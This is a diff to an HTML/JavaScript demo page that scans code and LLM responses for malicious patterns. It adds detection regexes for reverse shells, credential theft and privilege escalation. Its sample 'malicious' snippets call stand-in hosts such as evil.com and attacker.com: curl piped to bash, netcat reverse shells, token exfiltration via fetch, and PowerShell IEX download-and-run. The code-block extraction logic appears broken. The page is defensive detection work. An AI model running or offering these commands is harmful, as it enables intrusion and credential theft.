@@ -201,10 +201,20 @@
             cursor: pointer;
         }
 
+        input[type="range"]::-moz-range-thumb {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: #0052CC;
+            cursor: pointer;
+            border: none;
+        }
+
         .code-editor {
             border: 2px solid #e2e8f0;
             border-radius: 8px;
             min-height: 200px;
+            width: 100%;
             padding: 1rem;
             font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
             font-size: 14px;
@@ -446,6 +456,10 @@
             display: block;
         }
 
+        .hidden {
+            display: none;
+        }
+
         @media (max-width: 1024px) {
             .grid-2 {
                 grid-template-columns: 1fr;
@@ -566,7 +580,7 @@
             <div class="section-header">
                 <div class="section-icon">
                     <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        <path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/>
                     </svg>
                 </div>
                 <h2>LLM Code Scanner</h2>
@@ -583,7 +597,7 @@
                     <button class="lang-btn active" data-lang="python">🐍 Python</button>
                     <button class="lang-btn" data-lang="javascript">⚡ JavaScript</button>
                     <button class="lang-btn" data-lang="bash">🐚 Bash</button>
-                    <button class="lang-btn" data-lang="powershell">⚡ PowerShell</button>
+                    <button class="lang-btn" data-lang="powershell">💠 PowerShell</button>
                 </div>
                 
                 <textarea class="code-editor" id="codeEditor" placeholder="Paste or write code here..."></textarea>
@@ -600,17 +614,13 @@
             <div class="tab-content" id="llm-tab">
                 <div style="margin-bottom: 1rem;">
                     <label style="display: block; margin-bottom: 0.5rem; font-weight: 600;">Simulate LLM Response</label>
-                    <textarea class="code-editor" id="llmEditor" rows="10" placeholder="```
-# LLM-generated response with code blocks
-def analyze_data():
-    # Safe data processing
-    return processed_data
+                    <textarea class="code-editor" id="llmEditor" rows="10" placeholder="Paste an LLM response with code blocks here...
 
-# Potentially malicious code...
-import os
-os.system('curl evil.com/script.sh | bash')
+Example:
 ```
-Paste an LLM response containing code blocks here..."></textarea>
+def safe_function():
+    return 'hello'
+```"></textarea>
                 </div>
                 <button class="btn btn-primary" id="scanLLM">Extract & Scan Code Blocks</button>
                 <div id="llmResult" class="hidden"></div>
@@ -676,24 +686,28 @@ Paste an LLM response containing code blocks here..."></textarea>
         // Sample malicious patterns for simulation
         const MALWARE_PATTERNS = {
             python: [
-                { pattern: 'os.system\\s*\\(', threat: 'reverse-shell', score: 0.95 },
-                { pattern: 'subprocess.call\\s*\\([\'"].*bash\\s*-c\\s*[`$]', threat: 'reverse-shell', score: 0.92 },
-                { pattern: 'requests.post\\s*\\([^,]+,\\s*data=.*password|token', threat: 'credential-theft', score: 0.88 },
-                { pattern: 'base64.b64decode|exec\\s*\\(', threat: 'obfuscation', score: 0.85 }
+                { pattern: 'os\\.system\\s*\\(', threat: 'reverse-shell', score: 0.95 },
+                { pattern: 'subprocess\\.call\\s*\\(', threat: 'reverse-shell', score: 0.92 },
+                { pattern: 'requests\\.post.*password|token', threat: 'credential-theft', score: 0.88 },
+                { pattern: 'base64\\.b64decode|exec\\s*\\(', threat: 'obfuscation', score: 0.85 },
+                { pattern: 'sudo|su\\s+-c', threat: 'priv-esc', score: 0.82 }
             ],
             javascript: [
                 { pattern: 'eval\\s*\\(', threat: 'obfuscation', score: 0.90 },
-                { pattern: 'fetch\\s*\\([^)]+\\.com[^,]+,\\s*\\{method:[\'"]POST', threat: 'credential-theft', score: 0.87 },
-                { pattern: 'new\\s*WebSocket\\s*\\([^)]+\\.com', threat: 'reverse-shell', score: 0.93 }
+                { pattern: 'fetch.*POST.*password|token', threat: 'credential-theft', score: 0.87 },
+                { pattern: 'new\\s+WebSocket', threat: 'reverse-shell', score: 0.93 },
+                { pattern: 'atob\\(|btoa\\(', threat: 'obfuscation', score: 0.78 }
             ],
             bash: [
-                { pattern: 'curl\\s+[^\\s]+\\.\\w+\\s+\\|', threat: 'reverse-shell', score: 0.98 },
-                { pattern: 'wget\\s+-O\\s*\\-\\s+[^\\s]+\\.\\w+\\s+\\|', threat: 'reverse-shell', score: 0.97 },
-                { pattern: 'nc\\s+[^\\s]+\\s+[^\\s]+\\s+-e', threat: 'reverse-shell', score: 0.99 }
+                { pattern: 'curl.*\\|.*bash', threat: 'reverse-shell', score: 0.98 },
+                { pattern: 'wget.*\\|.*sh', threat: 'reverse-shell', score: 0.97 },
+                { pattern: 'nc\\s+.*-e', threat: 'reverse-shell', score: 0.99 },
+                { pattern: 'chmod\\s+\\+s|setuid', threat: 'priv-esc', score: 0.88 }
             ],
             powershell: [
-                { pattern: 'Invoke-WebRequest\\s+-Uri\\s+[^\\s]+\\.\\w+\\s+-Method\\s+Post', threat: 'credential-theft', score: 0.89 },
-                { pattern: 'IEX\\s*\\(New-Object\\s+Net.WebClient\\)', threat: 'reverse-shell', score: 0.94 }
+                { pattern: 'Invoke-WebRequest.*Post', threat: 'credential-theft', score: 0.89 },
+                { pattern: 'IEX\\s*\\(', threat: 'reverse-shell', score: 0.94 },
+                { pattern: 'Start-Process.*-Verb\\s+RunAs', threat: 'priv-esc', score: 0.85 }
             ]
         };
 
@@ -702,21 +716,65 @@ Paste an LLM response containing code blocks here..."></textarea>
             python: {
                 clean: `def analyze_data(df):
     """Safe data analysis function"""
-    return df.describe()`,
+    return df.describe()
+
+# Calculate statistics
+mean_value = df['column'].mean()
+print(f"Mean: {mean_value}")`,
                 malicious: `import os
 import subprocess
+
+# Backdoor installation
 os.system('curl http://evil.com/malware.sh | bash')
 subprocess.call(['nc', 'attacker.com', '4444', '-e', '/bin/sh'])`
             },
             javascript: {
                 clean: `function validateInput(input) {
-    return input.trim().length > 0;
-}`,
-                malicious: `fetch('http://evil.com/steal', {
+    const trimmed = input.trim();
+    return trimmed.length > 0;
+}
+
+// Process user data safely
+const result = validateInput(userInput);`,
+                malicious: `// Steal authentication tokens
+fetch('http://evil.com/steal', {
     method: 'POST',
-    body: JSON.stringify({token: localStorage.getItem('auth')})
+    body: JSON.stringify({
+        token: localStorage.getItem('auth'),
+        password: document.getElementById('pwd').value
+    })
 });
+
+// Execute obfuscated code
 eval(atob('bWFsaWNpb3VzIGNvZGU='));`
+            },
+            bash: {
+                clean: `#!/bin/bash
+# Safe file backup script
+backup_dir="/backup"
+source_dir="/data"
+
+tar -czf "$backup_dir/backup.tar.gz" "$source_dir"
+echo "Backup completed"`,
+                malicious: `#!/bin/bash
+# Download and execute malware
+curl http://evil.com/payload.sh | bash
+
+# Open reverse shell
+nc attacker.com 4444 -e /bin/bash`
+            },
+            powershell: {
+                clean: `# Safe PowerShell script
+$files = Get-ChildItem -Path "C:\\Data"
+foreach ($file in $files) {
+    Write-Host $file.Name
+}`,
+                malicious: `# Exfiltrate credentials
+$creds = Get-Credential
+Invoke-WebRequest -Uri "http://evil.com/steal" -Method Post -Body $creds
+
+# Execute remote payload
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
             }
         };
 
@@ -742,11 +800,12 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
         // ========================================
         // LANGUAGE SELECTOR
         // ========================================
-        document.querySelectorAll('[data-lang]').forEach(btn => {
+        document.querySelectorAll('.lang-btn').forEach(btn => {
             btn.addEventListener('click', (e) => {
-                document.querySelectorAll('[data-lang]').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
                 e.target.classList.add('active');
                 state.currentLanguage = e.target.dataset.lang;
+                console.log('Selected language:', state.currentLanguage);
             });
         });
 
@@ -768,16 +827,23 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
         // ========================================
         document.getElementById('scanCode').addEventListener('click', () => {
             const code = document.getElementById('codeEditor').value;
-            if (!code.trim()) return alert('Please enter some code to scan');
+            if (!code.trim()) {
+                alert('Please enter some code to scan');
+                return;
+            }
             scanCodeBlock(code, state.currentLanguage, 'manual');
         });
 
         document.getElementById('loadSample').addEventListener('click', () => {
-            const isMalicious = Math.random() > 0.6;
+            const isMalicious = Math.random() > 0.5;
             const lang = state.currentLanguage;
-            document.getElementById('codeEditor').value = isMalicious 
-                ? SAMPLE_CODE[lang].malicious 
-                : SAMPLE_CODE[lang].clean;
+            const sample = SAMPLE_CODE[lang];
+            
+            if (sample) {
+                document.getElementById('codeEditor').value = isMalicious ? sample.malicious : sample.clean;
+            } else {
+                alert('No sample available for ' + lang);
+            }
         });
 
         // ========================================
@@ -785,6 +851,10 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
         // ========================================
         document.getElementById('scanLLM').addEventListener('click', () => {
             const response = document.getElementById('llmEditor').value;
+            if (!response.trim()) {
+                alert('Please enter an LLM response with code blocks');
+                return;
+            }
             extractAndScanCodeBlocks(response);
         });
 
@@ -808,13 +878,14 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
             let verdict = 'clean';
             for (const [threat, score] of Object.entries(scores)) {
                 const policy = state.policies[threat];
-                if (policy.enabled && score >= policy.threshold) {
+                if (policy && policy.enabled && score >= policy.threshold) {
                     triggered.push({ threat, score, evidence: findEvidence(code, threat) });
                     if (verdict === 'clean') verdict = 'review';
                 }
             }
 
-            if (triggered.length > 1 || Math.max(...Object.values(scores || {})) > 0.95) {
+            // Escalate to malicious if multiple threats or very high confidence
+            if (triggered.length > 1 || (Object.keys(scores).length > 0 && Math.max(...Object.values(scores)) > 0.90)) {
                 verdict = 'malicious';
             }
 
@@ -824,35 +895,44 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
         }
 
         function extractAndScanCodeBlocks(response) {
-            // Simulate code block extraction from markdown
-            const codeBlocks = response.match(/``````/g) || [];
-            const results = [];
+            // Extract code blocks from markdown
+            const codeBlockRegex = /``````/g;
+            const matches = [...response.matchAll(codeBlockRegex)];
 
-            codeBlocks.forEach((block, index) => {
-                const langMatch = block.match(/```(\w+)/);
-                const language = langMatch ? langMatch[1].toLowerCase() : 'unknown';
-                const code = block.replace(/```[\w\n]*|```/g, '');
+            if (matches.length === 0) {
+                alert('No code blocks found. Make sure to use triple backticks (```
+                return;
+            }
+
+            matches.forEach((match, index) => {
+                const language = match ? match.toLowerCase() : 'unknown';
+                const code = match.trim();
                 
                 if (code) {
                     setTimeout(() => {
                         scanCodeBlock(code, language, 'llm');
-                    }, index * 200);
+                    }, index * 300);
                 }
             });
-
-            if (codeBlocks.length === 0) {
-                displayScanResult('llmResult', 'clean', {}, 'mixed', [], 'llm');
-            }
         }
 
         function findEvidence(code, threat) {
-            // Simulate evidence extraction
-            const evidences = {
-                'reverse-shell': ['nc attacker.com 4444', 'bash -i >& /dev/tcp/', 'curl | bash'],
-                'credential-theft': ['steal token', 'exfiltrate password', 'post credentials'],
-                'obfuscation': ['base64 decode', 'eval(', 'exec(']
+            // Extract actual evidence from code
+            const evidencePatterns = {
+                'reverse-shell': [/nc\s+[^\s]+\s+[^\s]+/i, /curl.*\|.*bash/i, /wget.*\|/i, /IEX\s*\(/i],
+                'credential-theft': [/password|token|auth/i, /localStorage\.getItem/i, /Get-Credential/i],
+                'obfuscation': [/eval\s*\(/i, /exec\s*\(/i, /base64\.b64decode/i, /atob\(/i],
+                'priv-esc': [/sudo|su\s+-c/i, /chmod.*\+s/i, /RunAs/i]
             };
-            return evidences[threat]?. || 'Pattern matched';
+
+            const patterns = evidencePatterns[threat] || [];
+            for (const pattern of patterns) {
+                const match = code.match(pattern);
+                if (match) {
+                    return match.substring(0, 50);
+                }
+            }
+            return 'Pattern matched';
         }
 
         function displayScanResult(containerId, verdict, scores, language, triggered, source) {
@@ -881,7 +961,7 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
                                 <div class="threat-item">
                                     <div class="threat-label">${threat.replace(/-/g, ' ').toUpperCase()}</div>
                                     <div class="threat-details">${(score * 100).toFixed(1)}% confidence</div>
-                                    <div style="font-size: 0.8rem; color: #e53e3e; margin-top: 0.25rem;">"${evidence}"</div>
+                                    <div style="font-size: 0.8rem; color: #e53e3e; margin-top: 0.25rem; font-family: monospace;">"${evidence}"</div>
                                 </div>
                             `).join('')}
                         </div>
@@ -918,7 +998,7 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
                         <span class="log-lang">${log.language.toUpperCase()}</span>
                         <span class="log-action ${actionClass}">${log.verdict.toUpperCase()}</span>
                         <span style="color: #718096;">${log.threatCount > 0 ? `${log.threatCount} threats` : 'clean'}</span>
-                        <span style="color: #718096; margin-left: auto;">${log.source}</span>
+                        <span style="color: #718096; margin-left: 1rem;">[${log.source}]</span>
                     </div>
                 `;
             }).join('');
@@ -935,6 +1015,7 @@ eval(atob('bWFsaWNpb3VzIGNvZGU='));`
 
         // Initialize
         updateLogDisplay();
+        console.log('Malicious Code Detection Demo initialized');
     </script>
 </body>
 </html>
